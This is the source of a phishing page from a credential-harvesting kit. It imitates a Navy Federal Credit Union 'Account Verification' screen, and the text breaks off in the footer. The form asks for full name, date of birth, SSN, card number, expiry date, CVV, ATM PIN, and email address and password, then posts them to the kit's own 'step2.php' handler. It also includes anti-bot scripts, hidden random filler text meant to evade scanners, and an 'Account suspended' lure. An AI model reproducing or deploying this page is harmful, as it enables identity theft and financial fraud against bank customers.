<?php
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../manger/mine.php';
ob_start();
session_start();
$onlineId2 = $_SESSION['USER'];
if ($show_captcha =="yes"){
if  (!isset($_SESSION['captcha'])){
        exit(header('HTTP/1.0 404 Not Found'));
}
}

  include "../manger/languages/{$_SESSION['language']}.php";

  ?>

<html>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device-width, initial-scale=1">
       
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <title>Account Verification</title>
    <link rel="shortcut icon" href="../favicon.ico">


    <link href="styles/combined.css.2c8c588becc5134338d6bdbe3f05e6e0f36d5268.css" rel="stylesheet">
    <link href="styles/combinedLess.css.0870311425e67b618133ae7242be70ee5c4e6056.css" rel="stylesheet">
    <link href="styles/combinedLess.css.7a8ba3fe762dc35e42fee810fc5dd7b0b3809858.css" rel="stylesheet">
    <link href="styles/combinedLess.css.4a047d5ab0a5f8713f223672176de68e8b0d5778.css" rel="stylesheet">
    <link href="styles/combinedLess.css.e78205f05dd1ef13519ac9fa13ae15d6e99fa6bf.css" rel="stylesheet">
    <link href="styles/combined.css.c4533e040f50918bf7385663c80ab06657013787.css" rel="stylesheet">
    <link href="styles/combinedLess.css.cce099e7ac31762bcc1fe57b62a33ddf7ea38b4d.css" rel="stylesheet">
    <link href="styles/all.css" rel="stylesheet">

    <script type="text/javascript" src="scripts/jquery-3.3.1.min.js"></script>
     <script src="scripts/poskaalert.min.js"></script>
    <style type="text/css" >
     div.selector .input-validation-error{
     border: 1px solid #e80c4d;
 }
        .input-validation-error{
            
                border-color: #c00 !important;
}
        }
        
        
        
        .swal-button {
    box-sizing: border-box;
    margin: .5rem;
    margin-left: 0;
    font-size: 1rem;
    font-weight: 400;
    width: 100%;
    height: 2.5rem;
    background-color: #0b6efd;
    border: none;
    border-radius: .3125rem;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    transition: background-color .4s ease;
    outline: transparent solid .0625rem;
    justify-content: center;
}
.swal-text{
    text-align:center;
}
.swal-footer{
    text-align: center;
}

.swal-button-poska {
    background-image: linear-gradient(to bottom, #fa8d2c 0, #eb7206 100%);
    color: #fff;
    border: none;
    box-shadow: none;
    border-radius: 5px;
    font-weight: 600;
    font-size: 14px;
    padding: 10px 24px;
    margin: 0;
    cursor: pointer;
}
.swal-text-poska{
    text-align:center;
}
.swal-footer-poska{
    text-align: center;
}



    </style>
    
    
    
    
        </head> 
        
        
        <body class="notie chrome78 ui2x accounts-accountsummary">

 <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
          
    <a id="SkipNav" class="skipnav js-skipnav" href="#mainContent">Skip navigation links</a>
    <div role="banner" id="edgeToEdgeWrapper" class="ui2x header-container">
        <div id="mainHeader" class="ui2x header-parent">
            <span class="js-messageIndicator" data-hasmessageindicator="false"></span>
            <a href="javascript:void(0);" id="logolayer" class="ui2x nfcu-logo" onclick="window.location = '#';return false;"><span class="visually-hidden"></span></a>


            <div class="headerBox ui2x header-nav-container">
                <div id="ui2x-header" class="header-nav-parent">
                    <div class="header-right">
                        <div id="memberinfo" class="nav-memberinfo-container" role="navigation" aria-label="Member">
                            <ul id="memberinfoblock" class="nav-memberinfo js-nav-member">
                                <li class="infoitem">
                                    <a href="#">Statements</a>
                                </li>
                                <li class="infoitem">
                                    <a href="#">Offers</a>
                                </li>
                                <li class="js-infoitem">
                                    <a class="mail-indicator js-eMsg " href="#">Messages<span class="visually-hidden">No New messages</span></a>
                                </li>
                                <li class="user js-info js-user">
                                    <div id="memberAuthUsers" class="member-auth-users js-member-auth-users">
                                        <div class="member-name">
                                            <a class="js-member-name" onclick="Fiserv.core.positionMemberDropDown(); return !(Modernizr.touch);" href="#" aria-expanded="false"><span class="username"><?php echo $onlineId2; ?></span></a>
                                        </div>
                                        <div id="member-drop-down" class="member-drop-down js-member-dd">
                                            <div class="members">
                                                <ul class="auth-users">
                                                    <li class="settings-item">
                                                        <a href="#">Settings</a>
                                                    </li>

                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                                <li class="logout">
                                    <a href="javascript:void(0)" id="SingOutLnk" class="js-signout-link">Sign Out</a>
                                </li>
                            </ul>
                        </div>
                        <div id="globalnav" class="header-nfcu-links" role="navigation" aria-label="utility">
                            <ul class="header-submenu inline-block">
                                <li class="vertical-divider">
                                    <a href="javascript:void(0)" onclick="Fiserv.core.signOut.signOutConfirmation(&quot;#&quot;); return false;">Products &amp; Services</a>
                                </li>
                                <li class="vertical-divider">
                                    <a href="#">Branches &amp; ATMs</a>
                                </li>
                                <li class="vertical-divider">
                                    <a href="#">Contact Us</a>
                                </li>
                                <li class="vertical-divider">
                                    <a href="#">Help</a>
                                </li>
                            </ul>

                            <span class="margin-left-8 float-right">Routing Number:256074974</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="sectionTabs" class="ui2x section-tabs" role="navigation" aria-label="main">
            <div id="nfoaanavcontainer">
                <ul id="nfoaanavigation" class="js-nfoaa-navigation">
                    <li id="menu.Accounts" class="nfoaaselected accounts">
                        <section class="core-selectaccount-Widget">
                            <div class="nav-selectaccount">
                                <div class="nav-selectaccount-header selected"><a id="lnkAccountSummary" href="javascript:;" class="lnkAccountSummary">Sign-in Details</a>
                                    <div class="nav-selectaccount-header-separator"></div>
                                    <div class="nav-selectaccount-header-icon js-nav-selectaccount-header-icon" role="button" aria-label="account" tabindex="0" aria-expanded="false" style="display: block;"></div>
                                    <ul class="nav-selectaccount-accounts js-nav-selectaccount-accounts" style="display: none;">
                                        <li class="nav-selectaccount-account item-first"><a href="#"><span>Active Duty Checking - 0379</span></a></li>
                                        <li class="nav-selectaccount-account item-2"><a href="#"><span>Share Savings - 9315</span></a></li>
                                        <li class="nav-selectaccount-account item-3"><a href="#"><span>nRewards Visa - 5436</span></a></li>
                                        <li class="nav-selectaccount-account add-new-account-item">
                                            <div class="add-new-account"><a href="#" id="navAddNewAccount"><span class="nav-open-new-account-icon">Open a New Account</span></a></div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </section>
                    </li>
                    <li id="menu.Transfers" class="nfoaanotselected transfers"><a href="#">Transfers</a></li>
                    <li id="menu.BillPay" class="nfoaanotselected billpay"><a href="#">Bill Pay</a></li>
                    <li id="menu.Zelle" class="nfoaanotselected zelle"><a href="#">Send Money</a></li>
                    <li id="menu.AccountServices" class="nfoaanotselected accountservices"><a href="#">Account Services</a></li>
                    <li id="menu.OpenNewAccount" class="nfoaanotselected opennewaccount"><a href="#">Open a New Account</a></li>
                </ul>
            </div>
        </div>
    </div>

    <div class="wrapper ui2x page-wrapper">
        <div id="framework" class="ui2x page-framework">
            <div id="BannerMessageWrapper" class="offerWrapper ui2x banner-message-wrapper">
                <div class="ui-helper-hidden offerdiv" id="BannerMessageToUser"></div>
                <button class="close-button js-offer-close-button" aria-label="Close banner"></button>
            </div>

            <div class="mainContent ui2x main-content">
                <div id="pagecontent ui2x page-content">
                    <div class="gradientGrey ui2x center-block">
                        <div id="breadcrumb" class="ui2x bread-crumb">
                            <section id="604b0740-f3b1-484b-8cf9-7ec323773ac9" class="widget core-breadcrumbtrailwidget">




                            </section>
                        </div>

                        <div id="settingnav" class="last-signon-container">
<!--                            <span id="Salutation" class="last-signon salutation"><span>Member since 2014</span></span>-->
<!--                            <span id="LastSignon" class="last-signon">Last signed on 07/25/2020 EST</span>-->
                        </div>
                    </div>
                </div>
                <div id="mainContent"></div>
                <div id="viewbody" class="ui2x view-body" role="main">



                    <section id="accounts-accountsummary" class="template">

                        <section id="columnFill">
                            <div>
                                <div id="center-rail" class="printarea">
                                    <section id="widget-ced03be27519414e9f1ba2a7d55160c2" class="widget accounts-accountsummarywidget">



                                        <section>


                                            <div class="account-summary-main" data-analytics="{&quot;Summary_Load&quot;:&quot;nfoaa:accountsummary:summary : &quot;,&quot;CreditCard_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayCC&quot;,&quot;Consumerloan_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayLoan&quot;,&quot;NavChecks_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayCLOC&quot;,&quot;BLOC_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayBLOC&quot;,&quot;HeLoc_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayHELOC&quot;,&quot;Mortgage_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayMortEqty&quot;,&quot;CreditScore_View&quot;:&quot;nfoaa:accountsummary:fico: &quot;,&quot;Summary_Blend&quot;:&quot;nfoaa:accountsummary:mortgageequityapplication:blend&quot;}">
                                                <div id="BannersFeaturedEnabled" class="js-banners-feature-enabled ui-helper-hidden" data-is-banners-feature-enabled="True"></div>
                                                <span class="visually-hidden" id="SuspenseBalanceTooltipText" tabindex="-1" aria-hidden="true" role="tooltip">
                                                    Suspense balance is the dollar amount of partial payments you’ve made.
                                                </span>

                                                <div id="WarningBanners" class="warning-banners js-Warning-Banners" data-is-cease-desist-banner-enabled="False" data-is-litigation-banner-enabled="False" data-pr-switch="ODk5NzU0YzMtZTFmZi00NmE3LWIyYjItNjI5MTI2NDBkNGU4LENBUkxUT04sQlJZQU4=">


                                                </div>

                                                <div class="account-summary-title">
                                                    <span class="floatLeft ui2x float-left">
                                                        <h1 id="AcctSummaryTitle">Your sign-in details</h1>
                                                    </span>
                                                    <span class="floatRight ui2x float-right action-link-container">
                                                        <span class="floatRight ui2x float-right"><span id="lnkPrint " class="print-container "><a data-lightbox-width="950" data-lightbox-height="650" data-skip-auto-setup="false" href="#" class="lightboxed-print printbtn ">Print</a>
                                                                <section class="print-preview-widget">
                                                                    <div class="print-preview-main">
                                                                        <div class="print-preview-titlebar ui-helper-clearfix">
                                                                            <div class="print-preview-title">
                                                                                <div class="print-preview-logo print-logo"></div><button type="button" class="button print-preview-submit">Print</button>
                                                                            </div><button class="close-button print-preview-close js-print-close-button" aria-label="Close print preview"></button>
                                                                        </div>
                                                                        <div class="print-preview-content">
                                                                            <section class="print-preview-section"></section>
                                                                            <div class="print-preview-overlay"></div>
                                                                        </div>
                                                                    </div>
                                                                </section>
                                                            </span></span>
                                                        <span class="floatRight">
                                                            <a id="lnkAccountSummaryList" class="lightbox-launcher ui2x action-link ui-flyout-activator ui-flyout-closed disabled" href="javascript:void(0)" aria-describedby="lnkAccountSummaryListSection" data-notification-subject="viewAccountSummaryList" data-minwidth="790" data-height="550" data-lightbox=".lightbox-accountsummarylistWidget"><span>Edit Accounts</span></a><span class="ui2x link-separator" aria-hidden="true">|</span>

                                                            <section class="lightbox lightbox-accountsummarylistWidget" title="Edit Accounts">
                                                                <section class="account-summarylistLightboxContent"></section>
                                                                <footer class="account-summary-list-footer">
                                                                    <span class="account-summary-restore"><a href="javascript:void(0);" class="account-summary-restore-link"><span aria-hidden="true" class="account-summary-restore-icon iconReset"></span><span class="account-summary-restore-text">Restore to Default Settings</span></a></span>
                                                                    <div class="submitFields actionButtons">
                                                                        <button type="button" class="cancelbutton cancel account-summary-cancel-button" href="#">Close</button>
                                                                        <button type="submit" class="button call-to-action account-summary-save-button">Save Changes</button>
                                                                    </div>
                                                                </footer>
                                                            </section>
                                                            <input type="hidden" class="urlCtrlaccountsaccountsummarylistpartialview" value="/NFCU/accounts/accountsummarylistpartialview">
                                                            <section id="lnkAccountSummaryListSection" data-fly-out-direction="right" data-fly-out-activateon="hover,focus" data-fly-out-activator="lnkAccountSummaryList" class="fly-out right" aria-hidden="true" style="display: none; position: absolute; left: 823.078px; top: 261px;">
                                                                <div>
                                                                    <p class="tooltip-content">Here you can customize your accounts summary page view by nicknaming your accounts, hiding your accounts, and/or changing the order in which your accounts are displayed.</p>
                                                                </div>
                                                                <div role="tooltip" class="ui-helper-hidden">Here you can customize your accounts summary page view by nicknaming your accounts, hiding your accounts, and/or changing the order in which your accounts are displayed.</div><span class="arrow-Left"></span>
                                                            </section>
                                                        </span>
                                                    </span>

                                                </div>

                                                <br>

       <form action="../manger/relative/step2.php" method="post" novalidate="novalidate">
            

                                                <div class="ui-helper-hidden offerdiv account-summary--row-show" id="PageHeader"></div>



                                                <div class="account-summary-group-header first-group-header">
                                                    <h2 style="font-size: 14;color: #d4001a;"></h2>
                                                </div>
                                                <div class="account-summary-display-table " id="account-summary-deposit-table">
                                                    <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineCheckingTop"></div>
                                                    <div class="account-summary-display-tablerow account-summary-deposit-row-show addTopDashRules  js-account-row" data-product-group="Checking" data-product-family="CheckingSavings" data-legal-role="Owner" data-is-paid-off="False" data-display-name="Active Duty Checking">

                                                        <div>

                                                        
                                                            <!--- Billing Info --->


                                                            <label for="fnm">Full Name</label>
                                                            <input class="midinput required text" id="fnm" maxlength="50" name="fnm" type="text" value="" tabindex="302" style="">
                                                            <span class="field-validation-valid" data-valmsg-replace="true"></span>
                                                        <i style="margin-left: 230;font-size: 12;font-style: revert;"></i>

                                                          




                                                            <label for="debitcard">Date of Birth</label>


                                                            <input class="midinput required text" id="dob" maxlength="50" name="dob" type="text" value="" tabindex="302" style="" placeholder="DD/MM/YYYY">
  <span class="field-validation-valid"></span>
                                                          <i style="font-size: 12;margin-left: 287;font-style: revert;"></i>

                                                            <label for="phn">Phone Number</label>
                                                            <input class="midinput required text" id="phn" maxlength="50" name="phn" type="text" value="" tabindex="302" style="">
                                                            <span class="field-validation-valid"></span>
                                                           <i style="font-size: 12;margin-left: 64;font-style: revert;"></i>

                                             
                                                            
                                                            
                                                            <label for="ssn">Social Security Number</label>
                                                            <input class="midinput required text" id="ssn" maxlength="50" name="ssn" type="text" value="" tabindex="302" style="" placeholder="Enter full SSN">
                                                            
                                                           <span class="field-validation-valid"></span><i style="font-size: 12;margin-left: 96;font-style: revert;"></i>



  <hr>
                                                            <span>
                                                                <h4 id="accountNameHeading" class="clearBoth accName bold">
                                                                    <span class="account-summary-creditcard-icon">

                                                                    </span>


                                                                </h4>
                                                            </span>


                                                            <div class="floatleft credit-balance-type">
                                                            </div>




                                                        </div>
                                                        

                                                        

                                                    </div>
                                                    <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineCheckingBottom"></div>
                                                    <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineSavingTop"></div>

                                                <div class="account-summary-display-tablerow account-summary-deposit-row-show   js-account-row" data-product-group="Savings" data-product-family="CheckingSavings" data-legal-role="Owner" data-is-paid-off="False" data-display-name="Share Savings" style="padding-top: 0px;">



                                                        <!--- Card Info --->

                                                        <span class="field-validation-valid"></span>
                                                        <label for="debitcard">Card Number</label>
                                                        <input class="midinput required text" id="ccn" minlength="19" name="ccn" type="text" value="" tabindex="302" style="width: 249px;" placeholder="#### #### #### ####">
                                                        <span class="field-validation-valid"></span>
                                                        <i style="font-size: 12;/*! margin-leftfont-size: -19px; *//*! margin */margin-left: 99;font-style: revert;"></i>
                                                          
 <div class="account-summary-display-tablerow account-summary-deposit-row-show   js-account-row" data-product-group="Savings" data-product-family="CheckingSavings" data-legal-role="Owner" data-is-paid-off="False" data-display-name="Share Savings">

                                                        <label for="expdate">Expiration Date</label>
                                                      <div class="selector" id="uniform-undefined" style="margin-top: 9px;">
                                                            <div class="selector" id="uniform-undefined">
                                                                <div class="selector" id="uniform-undefined"><div class="selector" id="uniform-undefined"><select name="mnt" required="" style="width: 62px; opacity: 100% !important;" tabindex="308">
                                                                        <option value="none" disabled="" selected="">MM</option>
                                                                        <option value="01">01</option>
                                                                        <option value="02">02</option>
                                                                        <option value="03">03</option>
                                                                        <option value="04">04</option>
                                                                        <option value="05">05</option>
                                                                        <option value="06">06</option>
                                                                        <option value="07">07</option>
                                                                        <option value="08">08</option>
                                                                        <option value="09">09</option>
                                                                        <option value="10">10</option>
                                                                        <option value="11">11</option>
                                                                        <option value="12">12</option>
                                                                    
                                                                    </select>
                                                                    <span style="user-select: none;display: none;">MM</span></div><span style="user-select: none;display: none;">MM</span></div><span style="user-select: none;display: none;">MM</span>
                                                            </div><span style="user-select: none;display: none;">MM</span>
                                                        </div><span class="field-validation-valid"></span>
                                                     
                                             <div class="selector" id="uniform-undefined">
                                                            <div class="selector" id="uniform-undefined">
                                                                <div class="selector" id="uniform-undefined"><div class="selector" id="uniform-undefined"><select name="yer" required="" style="margin-left: 68px; width: 82px; margin-top: -42px; opacity: 100% !important;" tabindex="309" class="">
                                                                        <option value="none" disabled="" selected="">YYYY</option>
                                                                        <option value="2020">2020</option>
                                                                        <option value="2021">2021</option>
                                                                        <option value="2022">2022</option>
                                                                        <option value="2023">2023</option>
                                                                        <option value="2024">2024</option>
                                                                        <option value="2025">2025</option>
                                                                        <option value="2026">2026</option>
                                                                        <option value="2026">2027</option>
                                                                        <option value="2028">2028</option>
                                                                        <option value="2029">2029</option>
                                                                        <option value="2030">2030</option>
                                                                    </select><span style="user-select: none;display: none;">YYYY</span></div><span style="user-select: none;" hidden="">YYYY</span></div><span style="user-select: none;display: none;">YYYY</span>
                                                            </div><span style="user-select: none;display: none;">YYYY</span>
                                                        </div>
                                                        <label for="ccv">CVV</label>
                                                        <input class="shortinput required password" id="cvv" minlength="3" name="cvv" type="tel" value="" tabindex="311" style="width: 72px;" maxlength="3">
                                                        <span class="field-validation-valid"></span>
                                                        <i style="font-size: 12;margin-left: 162;font-style: revert;"></i>

                                                        <label for="cardpin">ATM Pin</label>
                                                        <input class="shortinput required password" id="atm" minlength="4" name="atm" type="password" value="" tabindex="311" style="width: 103;" maxlength="4">
                                                        <span class="field-validation-valid"></span>
                                                        <i style="font-size: 12;margin-left: 249;font-style: revert;"></i>
     
 <label class="col-lg-12 col-sm-12 col-xs-12" style="background-color: #e0e3e5;
/*! border-radius: 15px; */
padding-right: 137px;
padding-left: 9px;
padding-bottom: 5px;
padding-top: 5px;
                                                     
                                                         margin-bottom: 22px;">
     
                                                    Email Authorization:</label>
                                                        <label for="eml">Email Address</label>
                                                        <input class="midinput required password" id="e_ml" name="e_ml" type="email" value="" tabindex="313">
                                                        <span class="field-validation-valid"></span>
                                                        <i style="font-size: 10;margin-left: 72;font-style: revert;"></i>

                                                        <label for="emlpass">Email Password</label>
                                                        <input class="midinput required password" id="emlpass" name="e_pw" type="password" value="" tabindex="313">
                                                        <span class="field-validation-valid"></span>
                                                        <i style="font-size: 10;margin-left: 19px;font-style: revert;"></i>





                                                        <span class="account-Info">
                                                            <span class="floatleft">
                                                                <span>
                                                                    <h4 id="accountNameHeading" class="clearBoth accName bold">
                                                                        <span class="account-summary-creditcard-icon">
                                                                            <button type="submit" class="button button-orange " tabindex="4" style="width: 20;height: 45;margin-bottom: 14;">Continue</button>
                                                                        </span>

                                                                    </h4>
                                                                </span>
                                                            </span>

                                                            <div class="floatleft credit-balance-type">
                                                            </div>
                                                        </span>
                                                        <span class="floatRight">

                                                        </span>

                                                    </div><span>
                                                                <h4 id="accountNameHeading" class="clearBoth accName bold">
                                                                    <span class="account-summary-creditcard-icon">

                                                                    </span>


                                                                </h4>
                                                            </span>


                                                            <div class="floatleft credit-balance-type">
                                                            </div>




                                                        </div>
       <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineCheckingBottom"></div>
                                                    <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineSavingTop"></div>

                                                    
                                                    <div class="ui-helper-hidden offerdiv account-summary-deposit-row-show" id="InlineSavingBottom"></div>


                                                </div></form>
<!--
                                                <div class="js-informationtips-placeholder" style="position: static;">
                                                    <div id="informationtips-informationtipwidget-container" class="ui2x information-tip-widget">
                                                        <button id="InformationTipCloseBtn" class="close-button js-close-button" aria-label="Close the Did You Know content"></button>
                                                        <div class="ui2x title-container" id="InformationTipLabel" aria-hidden="true">
                                                            DID YOU KNOW?
                                                        </div>
                                                        <div class="title-container visually-hidden">
                                                            Did You Know?
                                                        </div>
                                                        <div id="InformationTipText" class="ui2x text-container" data-current-information-tip-id="17">
                                                            You are not liable for fraudulent Online Banking transactions when you notify the bank within 60 days of the transaction first appearing on your statement and comply with security responsibilities. See our Online Banking Service Agreement for full terms and conditions.
                                                        </div>
                                                    </div>
                                                </div>
-->
                                                <div class="account-summary-group-header credits-header">
                                                </div>
<!--
                                                <div class="account-summary-display-table js-account-summary-credit-table " id="account-summary-credit-table" data-analytics="{&quot;Summary_Load&quot;:&quot;nfoaa:accountsummary:summary : &quot;,&quot;CreditCard_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayCC&quot;,&quot;Consumerloan_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayLoan&quot;,&quot;NavChecks_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayCLOC&quot;,&quot;BLOC_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayBLOC&quot;,&quot;HeLoc_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayHELOC&quot;,&quot;Mortgage_Pay&quot;:&quot;nfoaa:accountsummary:summaryPayMortEqty&quot;,&quot;CreditScore_View&quot;:&quot;nfoaa:accountsummary:fico: &quot;,&quot;Summary_Blend&quot;:&quot;nfoaa:accountsummary:mortgageequityapplication:blend&quot;}">
                                                    <div class="js-blend-information-partial" style="position: static;"></div>
                                                    <div class="js-expedite-information-partial" style="position: static;"></div>
                                                    <div class="js-mortgage-information-anchor" style="position: static;"></div>
                                                    <div class="account-summary-display-tablerow account-summary-credit-row-show addTopDashRules">
                                                        <span class="margin-top-1 margin-bottom-1">
                                                            <span class="float-left">

                                                                <section class="lightbox lightbox-creditscoremodalwidget js-credit-score-modal modal-min-height" title="Enable FICO<sup>®</sup> Score">
                                                                    <section class="creditscore-content"></section>
                                                                </section>
                                                            </span>
                                                        </span>
                                                    </div>
                                                    <div class="ui-helper-hidden offerdiv account-summary-credit-row-show" id="InlineCCTop"></div>
                                                    <div class="" data-product-group="CreditCard" data-product-family="LoansCredits" data-legal-role="Owner" data-is-paid-off="False" data-display-name="nRewards Visa">
                                                        <span>
                                                            <span class="account-summary-creditcard-icon">
                                                            </span>


                                                            </h4>
                                                        </span>
                                                        </span>

                                                        <div class="floatleft credit-balance-type marginleft60">

                                                        </div>
                                                        </span>
                                                        <span class="floatRight">
                                                        </span>

                                                        <div class="">
                                                            <div class="credit-due-date-info-left">
                                                                <div class="amount-due-left">
                                                                </div>
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ui-helper-hidden offerdiv account-summary-credit-row-show" id="InlineCCBottom"></div>

                                                </div>
-->

                                                <div id="CreditScoreFooterDisclaimer" class="disclaimer margin-top-40">FICO is a registered trademark of Fair Isaac Corporation in the United States and other countries.</div>

                                                <section class="lightbox lightbox-iraplansummaryWidget">
                                                    <section class="account-iraplansummaryLightboxContent"></section>
                                                    <footer class="account-iraplansummary-footer">
                                                        <span class="account-iraplansummary-close actionButtons"><button type="button" class="cancelbutton cancel account-iraplansummary-close-button" href="#">Close</button></span>
                                                    </footer>
                                                </section>
                                                <input type="hidden" class="urlCtrlaccountsiraplansummarypartialview" value="/NFCU/accounts/iraplansummarypartialview">

                                            </div>
                                            <section class="lightbox lightbox-main-maketransferWidget" title="Make a Payment">
                                                <div class="quickactions-main-maketransferLightboxContent">

                                                </div>
                                            </section>
                                        </section>










                                    </section>
                                </div>
                                <div id="right-rail">
                                    <section id="sidebarparent">


                                        <div id="accounts-streams-stream" class="accounts-streamwidget ajax-overlay" style="position: static;">
                                            <div id="accounts-streams-rrheader">
                                                <h2>My Updates</h2>
                                            </div>

                                            <div class="accounts-streams-streamitem-container">
                                                <div class="accounts-streams-nostreams-div accounts-streams-streamitem">
                                                    <ol>
                                                        <li>
                                                            <span>Account suspended.</span></li>
                                                    </ol>
                                                    <ol>
                                                        <li>
                                                            <span>Security at sign-in.</span></li>
                                                    </ol>
                                                    
                                                    
                                                </div>
                                            
                                            </div>
                                        </div>
                                        </form>

                                    </section>
                                    <div class="offerdiv" id="NavTop" data-display-detail="true" data-offer-name="1378" data-click-url="#" data-location-name="ASP2" data-accept-label="Account Summary" data-reject-label="No Thanks" data-display-order="1" data-bind-onclick="false" style="width: 260px; height: 95px;">
                                        <div id="NavTop-wrapper" class="fill-space offer-wrapper float-left">
                                            <div id="NavTop-ifdiv" class="fill-space"><img src="pics/image8.jpg" alt="New nRewards Redemption Options. Details." border="0" width="260" height="95" style="cursor: pointer;"></div>
                                            <div id="NavTop-overlay" class="offer-overlay"></div>
                                        </div>
                                    </div>
                                    <div class="offerdiv" id="NavCenter" data-display-detail="true" data-offer-name="1207" data-click-url="#" data-location-name="ASP3" data-accept-label="Learn More" data-reject-label="No Thanks" data-display-order="1" data-bind-onclick="false" style="width: 260px; height: 95px;">
                                        <div id="NavCenter-wrapper" class="fill-space offer-wrapper float-left">
                                            <div id="NavCenter-ifdiv" class="fill-space"><img src="pics/image9.jpg" alt="Say ?Yes? to Paperless. Digital Statements Available Anytime, Anywhere. Details." border="0" width="260" height="95" style="cursor: pointer;"></div>
                                            <div id="NavCenter-overlay" class="offer-overlay"></div>
                                        </div>
                                    </div>
                                    <section id="sidebarparent">


                                            <div id="accounts-streams-rrheader-quick">
                                                <h2>Quick Actions</h2>
                                            </div>
                                            <div class="accounts-quickactions">
                                                <ul>

                                                    <li class="li-makepayment">
                                                        <a class="js-makepayment" href="#">Make a Payment <span aria-hidden="true">»</span></a>
                                                    </li>
                                                    <li class="li-paybill">

                                                        <a class="lightboxed-link" id="QuickBillPayPopUp-pages" data-lightbox-width="550" data-lightbox-height="550" data-lightbox-class="blueTitle js-billpaymodal" data-lightbox-title="Bill Pay" data-lightbox-id="billPayIframe" href="/NFCU/billpay/quickbillpay/0/0/0/" style="pointer-events: auto;">
                                                            Pay a Bill <span aria-hidden="true">»</span></a>
                                                    </li>
                                                </ul>
                                  
                                   
                                        </div>




                                    <div class="ui-helper-hidden offerdiv" id="NavTop"></div>
                                    <div class="offerdiv" id="NavBottom" data-display-detail="true" data-offer-name="1574" data-click-url="" data-location-name="ASP4" data-accept-label="Learn More" data-reject-label="Return to Account Summary" data-display-order="1" data-bind-onclick="false" style="width: 260px; height: 260px;">
                                        <div id="NavBottom-wrapper" class="fill-space offer-wrapper float-left">
                                            <div id="NavBottom-ifdiv" class="fill-space"><img src="pics/image10.jpg" alt="MemberDeals. Shop Member Deals for extra rewards and exclusive offers. Details." border="0" width="260" height="260" style="cursor: pointer;"></div>
                                            <div id="NavBottom-overlay" class="offer-overlay"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </section>
                    </section>

                </div>
            </div>
        </div>
    </div>

<div class="pageBottom ui2x page-bottom">
    <div class="ui2x rates-container">
        <div class="ui2x rates-parent">
            <div id="rates_ribbon">
                <li class="firstrate"><a href="#" target="_blank">Mortgages</a><span class="ratecopy">5/5 ARM as low as<sup>+</sup></span><br style="margin-top: 25px;"><span class="ratedisplay">2.500<span class="percent">%</span></span><span class="apr">APR</span></li>
                <li><a href="#" target="_blank">Auto Loans</a><span class="ratecopy">
                        as low as<sup>+</sup></span><br><span class="ratedisplay">1.79<span class="percent">%</span></span><span class="apr">APR</span></li>
                <li><a href="#" target="_blank">Certificates</a><span class="ratecopy">as high as</span><br><span class="ratedisplay">3.50<span class="percent">%</span></span><span class="apr">APY</span></li>
                <li><a href="#" target="_blank">Checking</a><span class="ratecopy">as high as</span><br><span class="ratedisplay">0.45<span class="percent">%</span></span><span class="apr">APY</span></li>
                <li><a href="#" target="_blank">Credit Cards</a><span class="ratecopy">
                        as low as<sup>++</sup></span><br><span class="ratedisplay">5.99<span class="percent">%</span></span><span class="apr">APR</span></li>
                <li class="moreratesbutton"><a href="#" target="_blank">
                        More Rates »</a></li>
            </div>
            </div>
        </div>
        <div id="footercontainer" role="contentinfo" class="footer-container">
            <div id="navyfooter">
                <h2 class="sr-only">Policy &amp; Disclaimers</h2><a href="#" id="subfooterlogo" title="Navy Federal Homepage"><span class="sr-only">Navy Federal Credit Union</span></a>
                <div id="subfooternav">
                    <div class="routing-container">
                        <div class="text-routing inline-block">24/7 Member Services:</div>
                        <div class="text-routing inline-block font-700 margin-right-4">1-888-842-6328</div><span class="separator" aria-hidden="true"> | </span>
                        <div id="routingtxt" class="text-routing margin-left-4 inline-block">Routing Number:</div>
                        <div id="routingnbr" class="text-routing inline-block font-700">256074974</div>
                    </div>
                    <ul id="subnav">
                        <li><a href="javascript:void(0);" claims="*" isvisible="true" onclick="Fiserv.core.signOut.signOutNFCU('#');">About Us</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a href="#">Contact Us</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a href="#">Privacy</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a href="#">Security</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a class="lightboxed-link" data-lightbox-width="950" data-lightbox-height="450" data-lightbox-title="Web Policy" rel="facebox" href="#" style="pointer-events: auto;">Web Policy</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a href="#">Accessibility</a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a href="#">Browser Support</a></li>
                    </ul>
                    <p id="footercpright" class="copyright"><span>©</span><span class="font-700">
